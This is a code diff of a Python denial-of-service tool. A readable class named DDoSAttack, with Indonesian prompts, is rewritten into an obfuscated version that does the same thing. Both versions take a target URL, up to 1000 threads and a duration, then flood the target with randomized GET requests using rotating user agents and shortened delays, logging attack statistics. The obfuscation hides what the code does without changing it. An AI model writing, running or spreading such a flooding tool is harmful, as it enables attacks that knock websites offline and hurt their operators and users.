@@ -1,177 +1,124 @@
-import requests
-import threading
-import time
-import random
-import logging
-from requests.adapters import HTTPAdapter
-from requests.packages.urllib3.util.retry import Retry
-from concurrent.futures import ThreadPoolExecutor, as_completed
+lllllllllllllll, llllllllllllllI, lllllllllllllIl, lllllllllllllII, llllllllllllIll, llllllllllllIlI, llllllllllllIIl, llllllllllllIII, lllllllllllIlll, lllllllllllIllI, lllllllllllIlIl = Exception, FileNotFoundError, open, print, range, input, str, bool, __name__, ValueError, int
 
-class DDoSAttack:
-    def __init__(self, url, threads, duration):
-        self.url = url
-        self.threads = threads
-        self.duration = duration
-        self.request_count = 0
-        self.success_count = 0
-        self.error_count = 0
-        self.lock = threading.Lock()
-        self.timeout = 3
-        self.logger = self.setup_logging()
-        self.session = self.setup_session()
-        
-    def setup_logging(self):
-        logging.basicConfig(
-            level=logging.INFO,
-            format='%(asctime)s - %(levelname)s - %(message)s',
-            handlers=[
-                logging.FileHandler('ddos_attack.log'),
-                logging.StreamHandler()
-            ]
-        )
-        return logging.getLogger(__name__)
+from threading import Lock as llllIlIIIllIlI
+from logging import FileHandler as IIlllllIlIIIII, INFO as IIIIIIlIIIlllI, StreamHandler as IlIIlllIlIIlll, getLogger as IIIllIllIIIIIl, basicConfig as IlIllIIlIlIlII
+from requests import Session as lIIIllIIlIIlll
+from random import randint as IllIIIIIlllIII, uniform as llllIlIlIlllll, choice as IIlIIlIlIlIIIl
+from time import sleep as llIIIlIlllllII, time as IIIIllIlIlIIIl
+from requests.adapters import HTTPAdapter as IIllIlIIlllIIl
+from requests.packages.urllib3.util.retry import Retry as IIIIIllIllIIlI
+from concurrent.futures import ThreadPoolExecutor as IIlIIlIIllIlIl, as_completed as lIIIIIIlIIlIIl
 
-    def setup_session(self):
-        session = requests.Session()
-        retry_strategy = Retry(
-            total=3,
-            backoff_factor=1,
-            status_forcelist=[429, 500, 502, 503, 504],
-        )
-        adapter = HTTPAdapter(
-            max_retries=retry_strategy,
-            pool_connections=1000,
-            pool_maxsize=1000
-        )
-        session.mount("http://", adapter)
-        session.mount("https://", adapter)
-        return session
+class lIlllIlIlIllIllIIl:
 
-    def load_user_agents(self, file_path="user-agent.txt"):
+    def __init__(lllIIIlIIlIIllIllI, lllllIlIIIlIIIIIII, IIllllIIlIlIlIIIII, lIllIlIIllIlllIIll):
+        lllIIIlIIlIIllIllI.lllllIlIIIlIIIIIII = lllllIlIIIlIIIIIII
+        lllIIIlIIlIIllIllI.IIllllIIlIlIlIIIII = IIllllIIlIlIlIIIII
+        lllIIIlIIlIIllIllI.lIllIlIIllIlllIIll = lIllIlIIllIlllIIll
+        lllIIIlIIlIIllIllI.llIIllIIlllIllllIl = 0
+        lllIIIlIIlIIllIllI.IIlIlIlIlIIIllIlII = 0
+        lllIIIlIIlIIllIllI.IllIIIIIIllIlllIII = 0
+        lllIIIlIIlIIllIllI.IlIllIlIlIlIIlllll = llllIlIIIllIlI()
+        lllIIIlIIlIIllIllI.llllllIIIlIIIIIlIl = 3
+        lllIIIlIIlIIllIllI.IlllllIlIlIIIIlIlI = lllIIIlIIlIIllIllI.lIlllllIIIlIllIlII()
+        lllIIIlIIlIIllIllI.lIlllIllllIllIIIII = lllIIIlIIlIIllIllI.IIIllIllIIlIIllllI()
+
+    def lIlllllIIIlIllIlII(lllIIIlIIlIIllIllI):
+        IlIllIIlIlIlII(level=IIIIIIlIIIlllI, format='%(asctime)s - %(levelname)s - %(message)s', handlers=[IIlllllIlIIIII('ddos_attack.log'), IlIIlllIlIIlll()])
+        return IIIllIllIIIIIl(lllllllllllIlll)
+
+    def IIIllIllIIlIIllllI(lllIIIlIIlIIllIllI):
+        lIlllIllllIllIIIII = lIIIllIIlIIlll()
+        lllIlIIIllIlllIIll = IIIIIllIllIIlI(total=3, backoff_factor=1, status_forcelist=[429, 500, 502, 503, 504])
+        IlIIIllIIIllIIlllI = IIllIlIIlllIIl(max_retries=lllIlIIIllIlllIIll, pool_connections=1000, pool_maxsize=1000)
+        lIlllIllllIllIIIII.mount('http://', IlIIIllIIIllIIlllI)
+        lIlllIllllIllIIIII.mount('https://', IlIIIllIIIllIIlllI)
+        return lIlllIllllIllIIIII
+
+    def llIllllllIIllIIllI(lllIIIlIIlIIllIllI, llIIIIIllIIIIIIllI='user-agent.txt'):
         """Memuat User-Agent dari file teks"""
         try:
-            with open(file_path, "r") as file:
-                user_agents = [line.strip() for line in file if line.strip()]
-                if not user_agents:
-                    raise ValueError("File User-Agent kosong.")
-                return user_agents
-        except FileNotFoundError:
-            self.logger.error("File user-agent.txt tidak ditemukan.")
-            return ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"]
+            with lllllllllllllIl(llIIIIIllIIIIIIllI, 'r') as IIlIllIIIIIlllllll:
+                IIIlIIllIlllllIlll = [lIIIlIIIIlIIlllllI.strip() for lIIIlIIIIlIIlllllI in IIlIllIIIIIlllllll if lIIIlIIIIlIIlllllI.strip()]
+                if not IIIlIIllIlllllIlll:
+                    raise lllllllllllIllI('File User-Agent kosong.')
+                return IIIlIIllIlllllIlll
+        except llllllllllllllI:
+            lllIIIlIIlIIllIllI.IlllllIlIlIIIIlIlI.error('File user-agent.txt tidak ditemukan.')
+            return ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36']
 
-    def generate_payload(self):
-        payloads = [
-            {"param": f"value{random.randint(1,1000)}"},
-            {"search": f"query{random.randint(1,1000)}"},
-            {"id": str(random.randint(1,1000))},
-            {"page": str(random.randint(1,100))},
-            {"limit": str(random.randint(10,100))},
-            {"offset": str(random.randint(0,1000))},
-            {"sort": random.choice(['asc', 'desc'])},
-            {"filter": random.choice(['active', 'inactive', 'all'])},
-        ]
-        return random.choice(payloads)
+    def IIllIlIllIIIIllIll(lllIIIlIIlIIllIllI):
+        IlIlIlIIIIllIllllI = [{'param': f'value{IllIIIIIlllIII(1, 1000)}'}, {'search': f'query{IllIIIIIlllIII(1, 1000)}'}, {'id': llllllllllllIIl(IllIIIIIlllIII(1, 1000))}, {'page': llllllllllllIIl(IllIIIIIlllIII(1, 100))}, {'limit': llllllllllllIIl(IllIIIIIlllIII(10, 100))}, {'offset': llllllllllllIIl(IllIIIIIlllIII(0, 1000))}, {'sort': IIlIIlIlIlIIIl(['asc', 'desc'])}, {'filter': IIlIIlIlIlIIIl(['active', 'inactive', 'all'])}]
+        return IIlIIlIlIlIIIl(IlIlIlIIIIllIllllI)
 
-    def generate_headers(self):
-        user_agents = self.load_user_agents()
-        return {
-            "User-Agent": random.choice(user_agents),
-            "Accept": random.choice([
-                "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                "application/json,text/plain,*/*",
-                "*/*"
-            ]),
-            "Accept-Language": random.choice([
-                "en-US,en;q=0.5",
-                "en-GB,en;q=0.5",
-                "fr-FR,fr;q=0.5"
-            ]),
-            "Accept-Encoding": "gzip, deflate",
-            "Connection": "keep-alive",
-            "Cache-Control": random.choice(["no-cache", "max-age=0"]),
-            "Pragma": "no-cache",
-            "DNT": random.choice(["1", "0"]),
-            "Upgrade-Insecure-Requests": "1"
-        }
+    def lIIlIllIIIIlIllIII(lllIIIlIIlIIllIllI):
+        IIIlIIllIlllllIlll = lllIIIlIIlIIllIllI.llIllllllIIllIIllI()
+        return {'User-Agent': IIlIIlIlIlIIIl(IIIlIIllIlllllIlll), 'Accept': IIlIIlIlIlIIIl(['text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'application/json,text/plain,*/*', '*/*']), 'Accept-Language': IIlIIlIlIlIIIl(['en-US,en;q=0.5', 'en-GB,en;q=0.5', 'fr-FR,fr;q=0.5']), 'Accept-Encoding': 'gzip, deflate', 'Connection': 'keep-alive', 'Cache-Control': IIlIIlIlIlIIIl(['no-cache', 'max-age=0']), 'Pragma': 'no-cache', 'DNT': IIlIIlIlIlIIIl(['1', '0']), 'Upgrade-Insecure-Requests': '1'}
 
-    def _send_request(self):
+    def IlIlIIlIlIlllIIllI(lllIIIlIIlIIllIllI):
         try:
-            headers = self.generate_headers()
-            payload = self.generate_payload()
-            time.sleep(random.uniform(0.01, 0.05))  # Kurangi delay untuk intensitas lebih tinggi
-
-            response = self.session.get(
-                self.url,
-                headers=headers,
-                params=payload,
-                timeout=self.timeout,
-                allow_redirects=False
-            )
-            with self.lock:
-                self.request_count += 1
-                if response.status_code == 200:
-                    self.success_count += 1
-
-            self.logger.debug(f"Request berhasil: {response.status_code}")
-            return response
-
-        except Exception as e:
-            with self.lock:
-                self.error_count += 1
-            self.logger.debug(f"Error dalam request: {str(e)}")
+            lIIIlllIIlIlIllIII = lllIIIlIIlIIllIllI.lIIlIllIIIIlIllIII()
+            lllIllIIllIlllIIll = lllIIIlIIlIIllIllI.IIllIlIllIIIIllIll()
+            llIIIlIlllllII(llllIlIlIlllll(0.01, 0.05))
+            llIIllIlIIlIIlIllI = lllIIIlIIlIIllIllI.lIlllIllllIllIIIII.get(lllIIIlIIlIIllIllI.lllllIlIIIlIIIIIII, headers=lIIIlllIIlIlIllIII, params=lllIllIIllIlllIIll, timeout=lllIIIlIIlIIllIllI.llllllIIIlIIIIIlIl, allow_redirects=llllllllllllIII(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 0))
+            with lllIIIlIIlIIllIllI.IlIllIlIlIlIIlllll:
+                lllIIIlIIlIIllIllI.llIIllIIlllIllllIl += 1
+                if llIIllIlIIlIIlIllI.status_code == 200:
+                    lllIIIlIIlIIllIllI.IIlIlIlIlIIIllIlII += 1
+            lllIIIlIIlIIllIllI.IlllllIlIlIIIIlIlI.debug(f'Request berhasil: {llIIllIlIIlIIlIllI.status_code}')
+            return llIIllIlIIlIIlIllI
+        except lllllllllllllll as IlIIllllIIIIllIIll:
+            with lllIIIlIIlIIllIllI.IlIllIlIlIlIIlllll:
+                lllIIIlIIlIIllIllI.IllIIIIIIllIlllIII += 1
+            lllIIIlIIlIIllIllI.IlllllIlIlIIIIlIlI.debug(f'Error dalam request: {llllllllllllIIl(IlIIllllIIIIllIIll)}')
             return None
 
-    def _attack_worker(self):
-        end_time = time.time() + self.duration
-        while time.time() < end_time:
-            self._send_request()
+    def IIIIlllIIIIllIIlll(lllIIIlIIlIIllIllI):
+        lIIllIIllIllIlllll = IIIIllIlIlIIIl() + lllIIIlIIlIIllIllI.lIllIlIIllIlllIIll
+        while IIIIllIlIlIIIl() < lIIllIIllIllIlllll:
+            lllIIIlIIlIIllIllI.IlIlIIlIlIlllIIllI()
 
-    def run(self):
-        self.logger.info(f"Memulai serangan pada {self.url}")
-        with ThreadPoolExecutor(max_workers=self.threads) as executor:
-            futures = [executor.submit(self._attack_worker) for _ in range(self.threads)]
-            for future in as_completed(futures):
+    def lIllIIIIlIlllllIll(lllIIIlIIlIIllIllI):
+        lllIIIlIIlIIllIllI.IlllllIlIlIIIIlIlI.info(f'Memulai serangan pada {lllIIIlIIlIIllIllI.lllllIlIIIlIIIIIII}')
+        with IIlIIlIIllIlIl(max_workers=lllIIIlIIlIIllIllI.IIllllIIlIlIlIIIII) as lIIlIIIlIlIlIllIII:
+            IIIIlIIIlIllllllII = [lIIlIIIlIlIlIllIII.submit(lllIIIlIIlIIllIllI.IIIIlllIIIIllIIlll) for lIIllIIlIlllIllllI in llllllllllllIll(lllIIIlIIlIIllIllI.IIllllIIlIlIlIIIII)]
+            for llllIIlIIIIIIlIIll in lIIIIIIlIIlIIl(IIIIlIIIlIllllllII):
                 try:
-                    future.result()
-                except Exception as e:
-                    self.logger.error(f"Kesalahan eksekusi: {e}")
+                    llllIIlIIIIIIlIIll.result()
+                except lllllllllllllll as IlIIllllIIIIllIIll:
+                    lllIIIlIIlIIllIllI.IlllllIlIlIIIIlIlI.error(f'Kesalahan eksekusi: {IlIIllllIIIIllIIll}')
+        lllIIIlIIlIIllIllI.lIllIIlIlIIllIIlII()
 
-        self.print_stats()
+    def lIllIIlIlIIllIIlII(lllIIIlIIlIIllIllI):
+        lllIIIlIIlIIllIllI.IlllllIlIlIIIIlIlI.info('=== Statistik Serangan ===')
+        lllIIIlIIlIIllIllI.IlllllIlIlIIIIlIlI.info(f'Total Request: {lllIIIlIIlIIllIllI.llIIllIIlllIllllIl}')
+        lllIIIlIIlIIllIllI.IlllllIlIlIIIIlIlI.info(f'Request Sukses: {lllIIIlIIlIIllIllI.IIlIlIlIlIIIllIlII}')
+        lllIIIlIIlIIllIllI.IlllllIlIlIIIIlIlI.info(f'Request Gagal: {lllIIIlIIlIIllIllI.IllIIIIIIllIlllIII}')
+        IIllIllIllIlIIIIIl = lllIIIlIIlIIllIllI.IIlIlIlIlIIIllIlII / lllIIIlIIlIIllIllI.llIIllIIlllIllllIl * 100 if lllIIIlIIlIIllIllI.llIIllIIlllIllllIl > 0 else 0
+        lllIIIlIIlIIllIllI.IlllllIlIlIIIIlIlI.info(f'Success Rate: {IIllIllIllIlIIIIIl:.2f}%')
 
-    def print_stats(self):
-        self.logger.info("=== Statistik Serangan ===")
-        self.logger.info(f"Total Request: {self.request_count}")
-        self.logger.info(f"Request Sukses: {self.success_count}")
-        self.logger.info(f"Request Gagal: {self.error_count}")
-        success_rate = (self.success_count / self.request_count) * 100 if self.request_count > 0 else 0
-        self.logger.info(f"Success Rate: {success_rate:.2f}%")
-
-def validate_input():
-    while True:
+def lIlllIIllllIlIlIlI():
+    while llllllllllllIII(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1):
         try:
-            url = input("Masukkan URL target: ")
-            if not url.startswith(('http://', 'https://')):
-                print("URL harus dimulai dengan http:// atau https://")
+            lllllIlIIIlIIIIIII = llllllllllllIlI('Masukkan URL target: ')
+            if not lllllIlIIIlIIIIIII.startswith(('http://', 'https://')):
+                lllllllllllllII('URL harus dimulai dengan http:// atau https://')
                 continue
-
-            num_threads = int(input("Masukkan jumlah thread (1-1000): "))
-            if not 1 <= num_threads <= 1000:
-                print("Jumlah thread harus antara 1-1000")
+            IIIIlllllllIllIIlI = lllllllllllIlIl(llllllllllllIlI('Masukkan jumlah thread (1-1000): '))
+            if not 1 <= IIIIlllllllIllIIlI <= 1000:
+                lllllllllllllII('Jumlah thread harus antara 1-1000')
                 continue
-
-            attack_duration = int(input("Masukkan durasi waktu serangan dalam detik (1-3600): "))
-            if not 1 <= attack_duration <= 3600:
-                print("Durasi harus antara 1-3600 detik")
+            IllIlIlIIlIIllIIll = lllllllllllIlIl(llllllllllllIlI('Masukkan durasi waktu serangan dalam detik (1-3600): '))
+            if not 1 <= IllIlIlIIlIIllIIll <= 3600:
+                lllllllllllllII('Durasi harus antara 1-3600 detik')
                 continue
+            return (lllllIlIIIlIIIIIII, IIIIlllllllIllIIlI, IllIlIlIIlIIllIIll)
+        except lllllllllllIllI:
+            lllllllllllllII('Input tidak valid. Mohon masukkan angka untuk thread dan durasi.')
 
-            return url, num_threads, attack_duration
-        except ValueError:
-            print("Input tidak valid. Mohon masukkan angka untuk thread dan durasi.")
-
-def main():
-    url, threads, duration = validate_input()
-    attack = DDoSAttack(url, threads, duration)
-    attack.run()
-
-if __name__ == "__main__":
-    main()
+def lIIlIlIIIIIIllIIlI():
+    (lllllIlIIIlIIIIIII, IIllllIIlIlIlIIIII, lIllIlIIllIlllIIll) = lIlllIIllllIlIlIlI()
+    IIllllIlllIIIlllIl = lIlllIlIlIllIllIIl(lllllIlIIIlIIIIIII, IIllllIIlIlIlIIIII, lIllIlIIllIlllIIll)
+    IIllllIlllIIIlllIl.lIllIIIIlIlllllIll()
+if lllllllllllIlll == '__main__':
+    lIIlIlIIIIIIllIIlI()
